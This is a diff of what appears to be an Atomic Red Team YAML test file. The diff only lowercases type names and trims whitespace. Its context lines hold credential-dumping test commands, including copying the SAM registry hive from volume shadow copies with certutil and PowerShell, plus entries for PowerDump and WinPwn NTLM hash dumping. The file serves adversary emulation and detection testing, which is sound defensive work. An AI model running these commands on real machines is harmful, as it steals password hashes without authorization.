@@ -70,11 +70,11 @@ atomic_tests:
       default: '%SystemRoot%/system32/config/SAM'
     file_name:
       description: Name of the copied file
-      type: String
+      type: string
       default: SAM
     copy_dest:
       description: Destination of the copied file
-      type: String
+      type: string
       default: '%temp%'
   executor:
     command: |
@@ -83,7 +83,7 @@ atomic_tests:
     elevation_required: true
     cleanup_command: |
       del #{copy_dest}\#{file_name} >nul 2>&1
-    
+
 - name: PowerDump Hashes and Usernames from Registry
   auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
   description: Executes a hashdump by reading the hashes from the registry.
@@ -112,17 +112,17 @@ atomic_tests:
   input_arguments:
     target_hive:
       description: Hive you wish to dump
-      type: String
+      type: string
       default: SAM
     limit:
       description: Limit to the number of shadow copies to iterate through when trying to copy the hive
-      type: Integer
+      type: integer
       default: 10
   executor:
     command: |
       for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a
     name: command_prompt
-    elevation_required: false 
+    elevation_required: false
     cleanup_command: |
       for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
 
@@ -135,11 +135,11 @@ atomic_tests:
   input_arguments:
     target_hive:
       description: Hive you wish to dump
-      type: String
+      type: string
       default: SAM
     limit:
       description: Limit to the number of shadow copies to iterate through when trying to copy the hive
-      type: Integer
+      type: integer
       default: 10
   executor:
     command: |
@@ -148,12 +148,12 @@ atomic_tests:
        ls "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
       }
     name: powershell
-    elevation_required: false 
+    elevation_required: false
     cleanup_command: |
       1..#{limit} | % {
         rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
       }
-      
+
 - name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
   auto_generated_guid: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
   description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn
